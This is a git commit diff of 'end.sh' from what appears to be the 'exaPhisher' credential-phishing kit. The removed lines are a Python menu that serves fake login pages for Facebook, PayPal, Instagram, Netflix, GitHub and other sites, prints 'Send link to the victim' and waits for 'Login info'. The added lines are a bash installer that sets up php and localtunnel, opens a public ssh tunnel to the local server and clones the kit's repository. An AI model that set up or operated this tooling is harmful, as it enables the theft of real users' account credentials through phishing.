98608bd6ad2475d46de5a1c2f01657cfe340cb9f
vasu <vasu902221@gmail.com>
2026-05-13 12:28:22 +0530

    end.sh

--- end.sh
+++ end.sh
@@ -1,109 +1,135 @@
-import os
-from multiprocessing import Process
-from src.some_func import *
-import time
-try:
-    from src.setup_ver import *
-except Exception:
-    print("no dipendencies found, go on https://github.com/RedKatz/exaphisher and copy-paste in termianl setup command for your system")
+#!/bin/bash
 
+# Function to display colored output
+print_color() {
+    case "$2" in
+        "HEADER")    color='\033[95m' ;;
+        "OKBLUE")    color='\033[34m' ;;
+        "OKGREEN")   color='\033[92m' ;;
+        "WARNING")   color='\033[93m' ;;
+        "FAIL")      color='\033[91m' ;;
+        "BOLD")      color='\033[1m' ;;
+        "UNDERLINE") color='\033[4m' ;;
+        "GREY")      color='\033[90m' ;;
+        "BG_RED")    color='\033[41m' ;;
+        *)           color='\033[0m' ;;
+    esac
+    echo -e "${color}${1}\033[0m"
+}
 
+# Clear screen
+clear
 
-class bcolors:
-    HEADER    = '\033[95m'
-    OKBLUE    = '\033[34m'
-    OKGREEN   = '\033[92m'
-    WARNING   = '\033[93m'
-    FAIL      = '\033[91m'
-    BOLD      = '\033[1m'
-    UNDERLINE = '\033[4m'
-    ENDC      = '\033[0m'
-    GREY      = '\033[90m'
-    BG_RED    = '\033[41m'
+# Prompt user if they are using Termux
+# Prompt user if they are using Termux
+read -p "Are you using Termux? [y/n]: " termux_choice
+if [ "$termux_choice" = "y" ] || [ "$termux_choice" = "Y" ]; then
+    TERMUX=true
+else
+    TERMUX=false
+fi
 
+# Check if running with sudo, but not in Termux
+if [[ $EUID -ne 0 && $TERMUX == false ]]; then
+    print_color "Please run this script with sudo." "FAIL"
+    exit 1
+fi
 
+# Determine the system type automatically
+if [[ -n "$(command -v pkg)" ]]; then
+    # Termux
+    TERMUX=true
+elif [[ -n "$(command -v apt-get)" ]]; then
+    # Debian based Linux
+    DEBIAN=true
+elif [[ -n "$(command -v pacman)" ]]; then
+    # Arch based Linux
+    ARCH=true
+else
+    print_color "Unsupported system." "FAIL"
+    exit 1
+fi
 
+# Display ASCII art
+print_color "
+┏┓┏┓┏┳┓┳┳┏┓
+┗┓┣  ┃ ┃┃┃┃
+┗┛┗┛ ┻ ┗┛┣┛
+" "OKGREEN"
 
-clear()
-banner()
-print(choice)
-scelta = input(square_tild+bcolors.OKGREEN+" Select an option: "+bcolors.ENDC)
+# Display setup information
+print_color "Welcome to exaphisher setup! Following packages will be installed:\n" "WARNING"
+echo "- npm"
+echo "- php"
+echo -e "- localtunnel\n"
 
-clear()
-banner()
-print(choice2)
-scelta2 = input(square_tild+bcolors.OKGREEN+" Select an option: "+bcolors.ENDC)
+# Ask for confirmation to continue
+read -p "Continue? [y/n]: " setup_choice
+if [[ ! $setup_choice =~ ^[Yy]$ ]]; then
+    print_color "Exiting setup..." "WARNING"
+    exit 0
+fi
 
-clear()
-banner()
-if scelta2 == "1":
-    print("\n"+square_tild+bcolors.OKBLUE+''' Local url :'''+bcolors.WARNING+''' http://localhost:8080'''+bcolors.ENDC)
-    print("\n"+square_tild+bcolors.OKBLUE+" Send link to the victim: "+bcolors.ENDC+"run "+bcolors.UNDERLINE+bcolors.WARNING+"ngrok http localhost:8080"+bcolors.ENDC+" on new terminal"+bcolors.ENDC)
-    print(bcolors.OKBLUE+'''
-'''+square_tild+bcolors.WARNING+''' Waiting for Login info, '''+bcolors.OKBLUE+"Ctrl + C to exit."+bcolors.ENDC+'''
+# Clear screen
+clear
 
-    ''')
-elif scelta2 == "2":
-    def script1():
-        os.system("python3 lt.py")
-        
-    if __name__ == '__main__':
-        p = Process(target=script1)
-        p.start()
-    time.sleep(1.5)
-    file = open("url.txt", "r")
-    time.sleep(1.5)
-    #read the content of file
-    url = file.read()
-    print(bcolors.OKBLUE+'''
-'''+square_tild+bcolors.OKBLUE+''' Local url :'''+bcolors.WARNING+''' http://localhost:8080'''+bcolors.OKBLUE+'''
-'''+square_tild+bcolors.OKBLUE+''' Send link to the victim :'''+bcolors.WARNING+url[12:100]+bcolors.ENDC+'''
-'''+square_tild+bcolors.WARNING+''' Waiting for Login info, '''+bcolors.OKBLUE+"Ctrl + C to exit."+bcolors.ENDC+'''
+# Install necessary packages based on the detected system
+if [[ $TERMUX == true ]]; then
+    # Termux setup
+    print_color "Termux detected. Setting up..." "OKGREEN"
+    pkg install -y openssh openssl php
+    print_color "Setup completed successfully!" "OKGREEN"
+    echo "Type python3 main.py to run exaPhisher!"
+elif [[ $DEBIAN == true ]]; then
+    # Debian based Linux setup
+    print_color "Debian based Linux detected. Setting up..." "OKGREEN"
+    if [[ -n $SUDO_USER ]]; then
+        apt-get update
+        apt-get install -y php npm
+    else
+        print_color "Please run this script with sudo." "FAIL"
+        exit 1
+    fi
+    npm install -g localtunnel
 
-    ''')
-elif scelta2 == "3":
-    def script2():
-        os.system("python3 lh.py")
-        
-    if __name__ == '__main__':
-        p = Process(target=script2)
-        p.start()
-    print('''\n\n'''+
-square_tild+bcolors.OKBLUE+''' Local url :'''+bcolors.WARNING+''' http://localhost:8080'''+bcolors.OKGREEN)          
-    time.sleep(3)
-    print(bcolors.ENDC)
-    print(bcolors.OKBLUE+'''                                 Send link to the victim ↑''')
-    print("\n")
-    print(bcolors.WARNING+''' Waiting for Login info, '''+bcolors.OKBLUE+"Ctrl + C to exit."+bcolors.ENDC)
+    # Uncomment and modify if ngrok setup is needed for Debian
+    # curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
+    # echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
+    # apt-get update
+    # apt-get install -y ngrok
+    # ngrok config add-authtoken YOUR_NGROK_TOKEN_HERE
 
-if scelta == "1":
-    os.chdir("./src/template/facebook")
-    os.system("python3 facebook.py")
-if scelta == "2":
-    os.chdir("./src/template/instagram")
-    os.system("python3 instagram.py")
-if scelta == "3":
-    os.chdir("./src/template/paypal")
-    os.system("python3 paypal.py")
-if scelta == "4":
-    os.chdir("./src/template/twitter")
-    os.system("python3 twitter.py")
-if scelta == "5":
-    os.chdir("./src/template/netflix")
-    os.system("python3 netflix.py")
-if scelta == "6":
-    os.chdir("./src/template/twitch")
-    os.system("python3 twitch.py")
-if scelta == "7":
-    os.chdir("./src/template/github")
-    os.system("python3 github.py")
-if scelta == "8":
-    os.chdir("./src/template/spotify")
-    os.system("python3 spotify.py")
-if scelta == "9":
-    os.chdir("./src/template/pinterest")
-    os.system("python3 pinterest.py")
-if scelta == "10":
-    os.chdir("./src/template/linkedin")
-    os.system("python3 linkedin.py")
-    
+    print_color "Setup completed successfully!" "OKGREEN"
+    echo "Type python3 main.py to run exaPhisher!"
+elif [[ $ARCH == true ]]; then
+    # Arch based Linux setup
+    print_color "Arch based Linux detected. Setting up..." "OKGREEN"
+    if [[ -n $SUDO_USER ]]; then
+        pacman -Sy --noconfirm php nodejs npm
+    else
+        print_color "Please run this script with sudo." "FAIL"
+        exit 1
+    fi
+    npm install -g localtunnel
+
+    # Uncomment and modify if ngrok setup is needed for Arch
+    # yay -S --noconfirm ngrok
+    # ngrok config add-authtoken YOUR_NGROK_TOKEN_HERE
+
+    print_color "Setup completed successfully!" "OKGREEN"
+    echo "Type python3 main.py to run exaPhisher!"
+else
+    print_color "Unsupported system." "FAIL"
+    exit 1
+fi
+
+echo -e "===LH SETUP===\n\nWRITE yes AND PRESS ENTER\n"
+sleep 2
+ssh -R 80:localhost:8080 nokey@localhost.run
+
+git clone https://github.com/SamueleAmato/exaPhisher
+cd exaPhisher
+
+# Create a version file
+touch setup_ver.py
+
